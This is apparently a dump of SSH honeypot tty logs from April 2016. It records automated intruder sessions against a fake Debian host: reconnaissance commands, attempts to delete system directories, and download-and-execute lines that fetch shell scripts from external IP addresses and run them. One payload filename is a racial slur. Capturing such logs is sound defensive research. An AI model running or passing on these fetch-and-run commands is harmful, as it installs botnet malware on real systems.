+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hsupport@svr04:~$ __________________________________
+Processing ../log/tty/20160430-025440-7b4f4491-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 02:54:40
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-025630-0b99a75a-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 02:56:30
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-030029-c256d465-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 03:00:29
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-030316-20a082b8-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 03:03:16
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-030524-740f7e53-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 03:05:24
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-030835-84314bde-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 03:08:35
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-031304-1e915dda-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 03:13:04
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-033103-3e5fe8a6-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 03:31:03
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-034719-8bbb9973-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hgit@svr04:~$ __________________________________
+Processing ../log/tty/20160430-034723-8bbb9973-1e.log file...
+Linux
+__________________________________
+Processing ../log/tty/20160430-034723-8bbb9973-2i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hgit@svr04:~$ __________________________________
+Processing ../log/tty/20160430-034727-8bbb9973-3e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
+__________________________________
+Processing ../log/tty/20160430-034728-8bbb9973-4i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hgit@svr04:~$ __________________________________
+Processing ../log/tty/20160430-034731-8bbb9973-5e.log file...
+ PID TTY      STAT    TIME COMMAND
+5673 pts/0    Ss      0:00 -bash
+5679 pts/0    R+      0:00 ps x
+__________________________________
+Processing ../log/tty/20160430-035239-f61c11fe-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hgit@svr04:~$ uname -a
+[4lLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux
+[4hgit@svr04:~$ [4l__________________________________
+Processing ../log/tty/20160430-060232-4a008f5e-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hadmin@svr04:~$ __________________________________
+Processing ../log/tty/20160430-090719-7d0dbc91-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hguest@svr04:~$ __________________________________
+Processing ../log/tty/20160430-090847-26d93692-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 09:08:47
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-091645-840fe472-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 09:16:45
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-131123-b99513d1-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160430-131139-b99513d1-1e.log file...
+Linux
+timed out waiting for input: auto-logout
+__________________________________
+Processing ../log/tty/20160430-131139-b99513d1-2i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160430-131155-b99513d1-3e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
+__________________________________
+Processing ../log/tty/20160430-131156-b99513d1-4i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160430-131211-b99513d1-5e.log file...
+ PID TTY      STAT    TIME COMMAND
+5673 pts/0    Ss      0:00 -bash
+5679 pts/0    R+      0:00 ps x
+__________________________________
+Processing ../log/tty/20160430-131212-b99513d1-6i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160430-131228-b99513d1-7e.log file...
+processor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+__________________________________
+Processing ../log/tty/20160430-131228-b99513d1-8i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hpi@svr04:~$ __________________________________
+Processing ../log/tty/20160430-131244-b99513d1-9e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
+__________________________________
+Processing ../log/tty/20160430-143914-11c72f5c-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# ss
+bash: ss: command not found
+root@svr04:~# wgeth [1D[1P[1D[1P http://101.201.210.55:280/shh
+[4l--2016-04-30 14:39:44
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160430-145810-72f306af-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# ss
+bash: ss: command not found
+root@svr04:~# timed out waiting for input: auto-logout
+__________________________________
+Processing ../log/tty/20160430-151331-d411558c-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# ss
+bash: ss: command not found
+root@svr04:~# ss
+bash: ss: command not found
+root@svr04:~# timed out waiting for input: auto-logout
+__________________________________
+Processing ../log/tty/20160430-153733-7f9a6915-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hsupport@svr04:~$ rm -rf /tmp/* && cd /tmp/ && wget http://80.82.70.231/memes/sh.sh && chmod 777 sh.sh && sh sh.sh
+[4l[4h[4l[4h[4l--2016-04-30 15:37:53
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4h[4lchmod: cannot access sh.sh: No such file or directory
+[4h[4l[4hsupport@svr04:/tmp$ __________________________________
+Processing ../log/tty/20160430-181724-6f36e75e-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 18:17:24
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+__________________________________
+Processing ../log/tty/20160430-182102-e730500a-0e.log file...
+rm: cannot remove `log': Is a directory
+rm: cannot remove `mail': Is a directory
+rm: cannot remove `tmp': Is a directory
+rm: cannot remove `opt': Is a directory
+rm: cannot remove `local': Is a directory
+rm: cannot remove `backups': Is a directory
+rm: cannot remove `spool': Is a directory
+rm: cannot remove `lib': Is a directory
+rm: cannot remove `cache': Is a directory
+--2016-04-30 18:21:02
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+--2016-04-30 18:21:02
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access x: No such file or directory
+chmod: cannot access nigger4: No such file or directory
+bash: ./nigger4: command not found
+__________________________________
+Processing ../log/tty/20160430-183046-87d6fbfc-0e.log file...
+--2016-04-30 18:30:46
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+chmod: cannot access sh.sh: No such file or directory
+bash: tftp: command not found
+__________________________________
+Processing ../log/tty/20160430-194238-d6ab4911-0e.log file...
+--2016-04-30 19:42:38
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+curl: Remote file name has no length!
+chmod: cannot access bins.sh: No such file or directory
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+chmod: cannot access tftp1.sh: No such file or directory
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
+	ls, lsmod, lzcat, lzma, md5sum, mdev, microcom, mkdir, mkfifo, mknod,
+	mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
+	netstat, nslookup, od, openvt, patch, pidof, ping, ping6, pivot_root,
+	poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,
+	reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq,
+	setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,
+	start-stop-daemon, stat, strings, stty, swapoff, swapon, switch_root,
+	sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, test, tftp,
+	time, timeout, top, touch, tr, traceroute, traceroute6, true, tty,
+	udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos,
+	unlzma, unxz, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi,
+	watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes,
+	zcat
+chmod: cannot access tftp2.sh: No such file or directory
+__________________________________
+Processing ../log/tty/20160430-195525-78421418-0e.log file...
+--2016-04-30 19:55:25
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+curl: Remote file name has no length!
+chmod: cannot access bins.sh: No such file or directory
+BusyBox v1.20.2 (Debian 1:1.20.0-7) multi-call binary.
+Copyright (C) 1998-2011 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: busybox --list[-full]
+   or: busybox --install [-s] [DIR]
+   or: function [arguments]...
+
+	BusyBox is a multi-call binary that combines many common Unix
+	utilities into a single executable.  Most people will create a
+	link to busybox for each function they wish to use and BusyBox
+	will act like whatever it was invoked as.
+
+Currently defined functions:
+	[, [[, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl,
+	bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt,
+	clear, cmp, cp, cpio, cttyhack, cut, date, dc, dd, deallocvt, depmod,
+	df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap,
+	dumpleases, echo, egrep, env, expand, expr, false, fgrep, find, fold,
+	free, freeramdisk, ftpget, ftpput, getopt, getty, grep, groups, gunzip,
+	gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id,
+	ifconfig, init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last,
+	less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup,
